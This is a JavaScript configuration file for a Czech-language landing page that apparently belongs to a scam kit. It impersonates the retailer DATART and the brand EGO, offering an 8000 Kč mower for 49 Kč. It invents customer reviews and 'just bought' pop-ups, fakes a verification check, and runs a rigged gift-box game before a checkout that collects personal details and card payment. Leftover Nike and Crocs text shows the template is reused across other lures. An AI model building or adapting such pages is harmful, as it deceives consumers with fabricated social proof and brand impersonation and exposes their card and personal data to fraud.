const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href;
const baseHref = window.location.protocol + '//' + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = (baseUrl ?? landingUrl).replace(/\/index\.html$/, '');

(function (exp) {
  const countryCode = "cz";
  const lang = "cs-CZ";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "VELIKOST: ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ]
  };

  const bottomRow = {
    bar: "menu",
    account: "Přihlásit se",
    heart: "Seznam přání",
    bag: "Košík",
    find: "Hledat"
  };

  const mainProduct = {
    header: "Omezená nabídka",
    name: "Akumulátorová sekačka EGO 21in s vlastním pohonem",
    oldPrice: "Kč 8000",
    newPrice: "Kč 49",
    selectText: "BARVA: ",
    text: `Pokud hledáte způsob, jak sekat trávník s menším nepořádkem, menší uhlíkovou stopou a bez výfukových plynů, sada akumulátorové sekačky na trávu s vlastním pohonem o rozměrech 21 palců a 56 V lithium-iontovou baterií s kapacitou 7,5 Ah a nabíječkou je ideálním řešením. S veškerým točivým momentem standardního benzinového motoru tato sekačka s vlastním pohonem usnadňuje práci v nejnáročnějších podmínkách sekání.
  `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "Barcelona, Španělsko",
      action: "Právě jsem dostal své dřeváky za 1,95 eur!",
      timeago: "před 15 sekundami",
    },
    {
      user: "Carlos B******",
      location: "Madrid, Španělsko",
      action: "Právě jsem dostal své dřeváky za 1,95 eur!",
      timeago: "před 25 sekundami",
    },
  ];

  const reviewsArr = [
    {
      name: "Matthieu",
      time: "Před jedním dnem",
      header: "Je to neuvěřitelné!",
      review: "Dlouho jsem snil o koupi nové sekačky na trávu, protože ta stará se rozbila. Děkuji DATART za výprodej!",
      image: "./index_files/review1.jpg",
      rating: 100,
    },
    {
      name: "Lucas",
      time: "Před dvěma dny",
      header: "Skvělé! Nemám slova.",
      review: "Dostal jsem svou sekačku EGO, vypadá ještě lépe než na fotografii!",
      image: "./index_files/review5.jpg",
      rating: 100,
    },
    {
      name: "Valentina",
      time: "Před dvěma dny",
      header: "Jednoduše skvělé.",
      review: "Můj manžel byl proti mé účasti, protože jsme o tomto výprodeji nic neslyšeli, ale když jsem dostala balíček, byl velmi šťastný.",
      image: "./index_files/review2.jpg",
      rating: 93,
    },
    {
      name: "Santiago",
      time: "Před čtyřmi dny",
      header: "Líbí se mi",
      review: "Jen se podívejte na můj trávník, je nádherný. Děkuji EGO a DATART za tento dárek.",
      image: "./index_files/review4.jpg",
      rating: 90,
    },
    {
      name: "Martina",
      time: "Před sedmi dny",
      header: "Wow, miluji tento produkt!",
      review: "To je nejlepší sekačka, kterou jsem kdy koupila, velmi dobrá kvalita a podle recenzí je trvanlivá. Děkuji za tento výprodej.",
      image: "./index_files/review3.jpg",
      rating: 80,
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "RECENZE A HODNOCENÍ",
    percent: "99%",
    rec: "Komentáře k této akci",
  };

  const questions = {
    _of: "Otázka {1} z {2}: ",
    arr: [
      {
        q: "Nakupovali jste na DATART?",
        a: [
          "Ano, koupil jsem to",
          "Ne, nikdy jsem nekoupil",
        ],
      },
      {
        q: "Jak jste se dozvěděli o této nabídce?",
        a: ["Na oficiálních stránkách", "Reklama na Facebooku", "Řekli přátelé"],
      },
      {
        q: "Proč kupovat sekačku na trávu?",
        a: ["Pro osobní použití", "Pro dárek"],
      },
    ],
  };

  const check = {
    title: "Vaše odpověď bude ověřena...",
    arr: [
      "Odpověděli jste na otázku 3/3.",
      "Vaše IP adresa neumožňuje vyvodit závěry o předchozích žádostech.",
      "Vaše odpověď byla ověřena.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Gratulujeme, potvrdili jste, že jste skutečná osoba",
        button: "OK",
        text: `
      <center>
      Dnes, {date}, máte možnost koupit si pár bot Nike Air Force 1'07 za speciální cenu
        <br><br>
        Vše, co musíte udělat, je vybrat správnou dárkovou krabičku.
        <br><br>
        Máte 3 pokusy, hodně štěstí!
      </center>
      `,
      },
    },
    first: {
      texts: {
        header: "Ach ne...",
        button: "OK",
        text: `
      <center>
      Bohužel je tento dárek prázdný! Zbývají vám ještě 2 pokusy - hodně štěstí!
      </center>
      `,
      },
    },
    win: {
      texts: {
        header: "Gratulujeme! Vyhráli jste!",
        button: "OK",
        text: `
      <center>
        <p style="color: #000">
        Vyhráli jste pár bot "Nike Air Force 1'07"
        </p>
        <br>
        1) Klikněte na "OK" a přejděte na stránku doručení.
        <br><br>
        2) Vyplňte formulář a zaplaťte objednávku se svou osobní slevou.
        <br><br>
        3) Balíček bude doručen za 2-3 dny.
      </center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Osobní údaje",
      fields: {
        name: {
          enabled: true,
          field: "Jméno",
        },
        family: {
          enabled: true,
          field: "Příjmení",
        },
        phone: {
          enabled: true,
          field: "Telefonní číslo",
        },
        email: {
          enabled: true,
          field: "E-mailová adresa",
        },
      },
    },
    delivery: {
      title: "Doručení",
      fields: {
        city: {
          enabled: true,
          field: "Město",
        },
        address: {
          enabled: true,
          field: "Doručovací adresa",
        },
        zip: {
          enabled: true,
          field: "PSČ",
        },
      },
    },
    payment: {
      title: "Platební metody",
      creditCard: "Online platba kreditní kartou",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Detaily objednávky",
      oldPrice: "Kč 8000",
      newPrice: "Kč 49",
      size: "Velikost",
      subTotal: {
        title: "Mezisoučet",
        amount: "Kč 49",
      },
      delivery: {
        title: "Doručení",
        amount: "Kč 0.00",
      },
      total: {
        title: "Celkem",
        amount: "Kč 49",
      },
      checkoutButton: "Zaplaťte objednávku",
    },
  };


  const products = [
    {
      id: "26468781",
      name: "Noir",
      miniImg: "./index_files/img/item1/item1.jpg",
      images: [
        "./index_files/img/item1/item1.jpg",
        "./index_files/img/item1/item2.jpg",
        "./index_files/img/item1/item3.jpg",
        "./index_files/img/item1/item4.jpg",
        "./index_files/img/item1/item5.jpg",
        // "./index_files/img/item1/item6.jpg",
        "./index_files/img/item1/item7.jpg",
        // "./index_files/img/item1/item8.jpg",
        // "./index_files/img/item1/item9.jpg",
      ],
    },
  ];

  const footer = {
    cr: "© Crocs™ | Copyright 2024 | Tous droits réservés",
  };


  const pathImgBox = {
    lid: "./index_files/box-lid.png",
    lidIOs: "./index_files/box-lid-ios.png",
    inner: "./index_files/box-inner.png",
    innerGift: "./index_files/box-inner-gift.png",
    box: "./index_files/box.png",
    boxModal: "./index_files/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    bottomRow
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);

const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value = `${mainProduct.name}: ${product.name}`;
  document.querySelector("input[name='product_image']").value = imageUrl;
  // console.log(localImageUrl);
  // console.log(imageUrl);

  return product;
};

const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;
  const selectedSize = sizes.arr?.[lsGetSelectedSizeInd()];
  document.querySelector("input[name='product_size']").value = selectedSize;

  return selectedSize;
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};

document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});
